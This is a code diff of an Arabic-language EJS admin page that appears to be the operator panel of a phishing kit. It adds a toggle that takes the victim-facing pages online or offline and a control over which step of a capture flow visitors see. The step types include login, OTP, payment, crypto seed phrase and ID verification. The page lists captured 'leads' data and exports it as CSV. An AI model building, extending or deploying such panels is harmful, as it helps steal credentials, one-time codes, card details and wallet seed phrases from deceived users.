@@ -7,64 +7,130 @@
 <style>
   * { box-sizing:border-box; }
   body { font-family:system-ui,Tahoma; background:#0b0f19; color:#eef2ff; margin:0; padding:28px; }
-  .wrap { max-width:1000px; margin:auto; }
+  .wrap { max-width:1060px; margin:auto; }
   a { color:#8ab4ff; text-decoration:none; }
-  h2 { margin:28px 0 14px; color:#8ab4ff; font-size:1.1rem; }
+  h2 { margin:28px 0 14px; color:#8ab4ff; font-size:1.05rem; }
   table { width:100%; border-collapse:collapse; background:#151b2b; border-radius:14px; overflow:hidden; margin-bottom:28px; }
-  th,td { padding:12px 14px; text-align:right; border-bottom:1px solid #ffffff10; font-size:.88rem; }
-  th { background:#1c2436; }
-  label { display:grid; gap:6px; font-size:.88rem; margin-bottom:12px; }
-  input,select { width:100%; padding:11px; border-radius:9px; border:1px solid #ffffff22; background:#ffffff0d; color:#eef2ff; font-family:inherit; font-size:.95rem; }
-  .btn { background:#5b8cff; color:#fff; padding:10px 18px; border:0; border-radius:9px; cursor:pointer; font-size:.9rem; }
+  th,td { padding:10px 12px; text-align:right; border-bottom:1px solid #ffffff10; font-size:.85rem; }
+  th { background:#1c2436; font-size:.82rem; }
+  label { display:grid; gap:6px; font-size:.85rem; margin-bottom:12px; }
+  input,select { width:100%; padding:10px; border-radius:9px; border:1px solid #ffffff22; background:#ffffff0d; color:#eef2ff; font-family:inherit; font-size:.92rem; }
+  .btn { background:#5b8cff; color:#fff; padding:9px 16px; border:0; border-radius:9px; cursor:pointer; font-size:.88rem; text-decoration:none; display:inline-block; }
   .btn-del { background:#ef4444; }
-  .badge { padding:3px 10px; border-radius:99px; font-size:.78rem; }
+  .btn-warn { background:#f59e0b; color:#000; }
+  .btn-green { background:#16a34a; }
+  .btn-gray { background:#374151; }
+  .badge { padding:3px 10px; border-radius:99px; font-size:.75rem; display:inline-block; }
   .on { background:#16a34a33; color:#4ade80; }
   .off { background:#ef444433; color:#f87171; }
+  .online-mode { background:#1e40af33; color:#93c5fd; }
+  .offline-mode { background:#78350f33; color:#fcd34d; }
   .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
-  .section { background:#151b2b; padding:20px; border-radius:14px; margin-bottom:20px; }
-  .section h3 { font-size:1rem; margin:0 0 14px; color:#8ab4ff; }
-  .lead-data { font-size:.82rem; max-width:320px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-  @media(max-width:600px) { .grid2 { grid-template-columns:1fr; } }
+  .grid3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; }
+  .section { background:#151b2b; padding:18px 20px; border-radius:14px; margin-bottom:18px; }
+  .section h3 { font-size:.95rem; margin:0 0 14px; color:#8ab4ff; }
+  .lead-data { font-size:.8rem; max-width:280px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .step-card { background:#0b0f19; border-radius:10px; padding:12px 14px; border:1.5px solid #ffffff12; }
+  .step-card .step-name { font-size:.82rem; font-weight:600; color:#8ab4ff; margin-bottom:4px; }
+  .step-card .step-form { font-size:.75rem; opacity:.5; }
+  .step-card a { font-size:.78rem; }
+  .step-badge { padding:2px 8px; border-radius:6px; font-size:.72rem; }
+  .form-login { background:#1e3a5f30; color:#60a5fa; }
+  .form-otp { background:#14532d30; color:#4ade80; }
+  .form-payment { background:#78350f30; color:#fcd34d; }
+  .form-seed_phrase { background:#4c1d9530; color:#c4b5fd; }
+  .form-verify,.form-id_verify { background:#1c1917; color:#d6d3d1; }
+  .form-checkpoint,.form-locked,.form-confirm,.form-complete { background:#1f2937; color:#9ca3af; }
+  @media(max-width:700px){.grid2,.grid3{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <p style="margin-bottom:18px"><a href="/admin">← لوحة التحكم</a></p>
+  <p style="margin-bottom:16px"><a href="/admin">← لوحة التحكم</a></p>
 
+  <!-- Header -->
   <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px;margin-bottom:20px">
     <div>
-      <h1 style="margin:0 0 6px;font-size:1.5rem"><%= page.title %></h1>
-      <p style="opacity:.6;font-size:.9rem;margin:0">
-        القالب: <b><%= page.template_name %></b> &nbsp;|&nbsp;
-        <span class="badge <%= page.active ? 'on' : 'off' %>"><%= page.active ? 'شغالة' : 'موقوفة' %></span> &nbsp;|&nbsp;
-        👁 <b><%= page.views %></b> مشاهدة
+      <h1 style="margin:0 0 6px;font-size:1.4rem"><%= page.title %></h1>
+      <p style="opacity:.6;font-size:.88rem;margin:0;display:flex;gap:12px;flex-wrap:wrap;align-items:center">
+        <span>القالب: <b><%= page.template_name %></b></span>
+        <span class="badge <%= page.active ? 'on' : 'off' %>"><%= page.active ? 'مفعّلة' : 'موقوفة' %></span>
+        <span class="badge <%= page.mode === 'offline' ? 'offline-mode' : 'online-mode' %>"><%= page.mode === 'offline' ? '📴 أوفلاين' : '🌐 أونلاين' %></span>
+        <span>👁 <b><%= page.views %></b></span>
       </p>
     </div>
-    <a href="/p/<%= page.slug %>/login" target="_blank" class="btn">🔗 عرض الصفحة</a>
+    <div style="display:flex;gap:8px;flex-wrap:wrap">
+      <a href="/p/<%= page.slug %>" target="_blank" class="btn">🔗 عرض</a>
+    </div>
   </div>
 
-  <!-- Leads Table -->
+  <!-- Mode + Flow Control -->
+  <div class="section">
+    <h3>🎛️ تحكم في المود والخطوات</h3>
+    <div class="grid2" style="margin-bottom:16px">
+      <!-- Online/Offline toggle -->
+      <div style="background:#0b0f19;border-radius:10px;padding:14px 16px">
+        <div style="font-size:.85rem;margin-bottom:8px;opacity:.7">المود الحالي</div>
+        <div style="font-size:1.1rem;font-weight:700;margin-bottom:12px"><%= page.mode === 'offline' ? '📴 أوفلاين (مغلق)' : '🌐 أونلاين (شغال)' %></div>
+        <form method="POST" action="/admin/pages/<%= page.id %>/mode">
+          <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+          <button type="submit" class="btn <%= page.mode === 'offline' ? 'btn-green' : 'btn-warn' %>" style="width:100%">
+            <%= page.mode === 'offline' ? '✅ تشغيل (أونلاين)' : '🔴 إيقاف (أوفلاين)' %>
+          </button>
+        </form>
+      </div>
+
+      <!-- Flow step override -->
+      <div style="background:#0b0f19;border-radius:10px;padding:14px 16px">
+        <div style="font-size:.85rem;margin-bottom:8px;opacity:.7">تحديد الخطوة الافتراضية</div>
+        <form method="POST" action="/admin/pages/<%= page.id %>/flow-step">
+          <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+          <select name="step" style="margin-bottom:10px">
+            <option value="">— الأولى تلقائياً —</option>
+            <% tpl.pages.forEach(p => { %>
+              <option value="<%= p.slug %>" <%= page.flow_step === p.slug ? 'selected' : '' %>><%= p.step_label || p.slug %></option>
+            <% }) %>
+          </select>
+          <button type="submit" class="btn btn-gray" style="width:100%">💾 تطبيق</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Pages/Steps list -->
+    <div style="font-size:.83rem;opacity:.6;margin-bottom:10px">خطوات الفلو (اضغط للمعاينة)</div>
+    <div class="grid3">
+      <% tpl.pages.forEach((p, i) => { %>
+        <div class="step-card">
+          <div class="step-name"><%= i+1 %>. <%= p.step_label || p.slug %> <span class="step-badge form-<%= p.form_type || p.layout %>"><%= p.form_type || p.layout %></span></div>
+          <div class="step-form" style="margin-bottom:6px"><%= (p.fields||[]).join(', ') || 'لا حقول' %></div>
+          <a href="/p/<%= page.slug %>/<%= p.slug %>" target="_blank">🔗 معاينة</a>
+        </div>
+      <% }) %>
+    </div>
+  </div>
+
+  <!-- Leads -->
   <h2>الليدز (<%= leads.length %>)</h2>
   <% if (leads.length) { %>
     <table>
-      <tr><th>#</th><th>المرحلة</th><th>البيانات</th><th>IP</th><th>التاريخ</th></tr>
+      <tr><th>#</th><th>الخطوة</th><th>البيانات</th><th>التاريخ</th></tr>
       <% leads.forEach(l => {
         let d = {}; try { d = JSON.parse(l.data); } catch {}
         const step = d.step || 'submit';
-        delete d.step; delete d._csrf;
+        delete d.step; delete d._csrf; delete d._hp; delete d._step;
         const preview = Object.entries(d).map(([k,v]) => `${k}: ${v}`).join(' • ');
+        const formType = tpl.pages.find(p=>p.slug===step)?.form_type || step;
       %>
         <tr>
           <td><%= l.id %></td>
-          <td><span class="badge <%= step === 'login' ? 'on' : step === 'otp' ? '' : 'on' %>" style="<%= step==='otp'?'background:#1e3a5f33;color:#60a5fa':'' %>"><%= step %></span></td>
+          <td><span class="badge step-badge form-<%= formType %>"><%= tpl.pages.find(p=>p.slug===step)?.step_label || step %></span></td>
           <td class="lead-data" title="<%= preview %>"><%= preview %></td>
-          <td style="font-size:.8rem;opacity:.6"><%= l.ip %></td>
-          <td style="font-size:.8rem;opacity:.6"><%= l.created_at %></td>
+          <td style="font-size:.78rem;opacity:.5"><%= l.created_at %></td>
         </tr>
       <% }) %>
     </table>
   <% } else { %>
-    <p style="opacity:.5;margin-bottom:28px">مفيش ليدز لسه.</p>
+    <p style="opacity:.4;margin-bottom:28px">مفيش ليدز لسه.</p>
   <% } %>
 
   <!-- Edit Form -->
@@ -77,27 +143,28 @@
         <label>السلاج<input name="slug" value="<%= page.slug %>" required></label>
       </div>
       <label>رقم القالب<input name="template_id" value="<%= page.template_id %>"></label>
-      <label>حقول الليد<input name="fields" value='<%= page.fields %>'></label>
+      <label style="display:flex;gap:8px;align-items:center;flex-direction:row">
+        <input type="checkbox" name="active" value="1" <%= page.active ? 'checked' : '' %> style="width:auto">
+        <span>الصفحة مفعّلة</span>
+      </label>
       <input type="hidden" name="headline" value="<%= page.headline || '' %>">
       <input type="hidden" name="subheadline" value="<%= page.subheadline || '' %>">
       <input type="hidden" name="body" value="<%= page.body || '' %>">
       <input type="hidden" name="button_text" value="<%= page.button_text || 'سجل الآن' %>">
       <input type="hidden" name="theme" value="<%= page.theme || 'dark' %>">
       <input type="hidden" name="pixel" value="<%= page.pixel || '' %>">
-      <label style="display:flex;gap:8px;align-items:center;flex-direction:row">
-        <input type="checkbox" name="active" value="1" <%= page.active ? 'checked' : '' %> style="width:auto">
-        <span>الصفحة مفعّلة</span>
-      </label>
-      <button type="submit" class="btn" style="margin-top:8px;width:auto;padding:10px 24px">💾 حفظ</button>
+      <input type="hidden" name="fields" value="<%= page.fields %>">
+      <button type="submit" class="btn" style="margin-top:10px;padding:10px 24px">💾 حفظ</button>
     </form>
   </div>
 
-  <div style="display:flex;gap:12px;flex-wrap:wrap">
+  <div style="display:flex;gap:10px;flex-wrap:wrap">
     <a href="/admin/templates?page_id=<%= page.id %>" class="btn">🎨 تغيير القالب</a>
     <% if (leads.length) { %>
-      <a href="/admin/pages/<%= page.id %>/export" class="btn" style="background:#16a34a">📥 تصدير CSV</a>
+      <a href="/admin/pages/<%= page.id %>/export" class="btn btn-green">📥 تصدير CSV</a>
     <% } %>
     <form method="POST" action="/admin/pages/<%= page.id %>/delete" onsubmit="return confirm('حذف الصفحة وكل الليدز؟')">
+      <input type="hidden" name="_csrf" value="<%= csrfToken %>">
       <button class="btn btn-del">🗑 حذف</button>
     </form>
   </div>
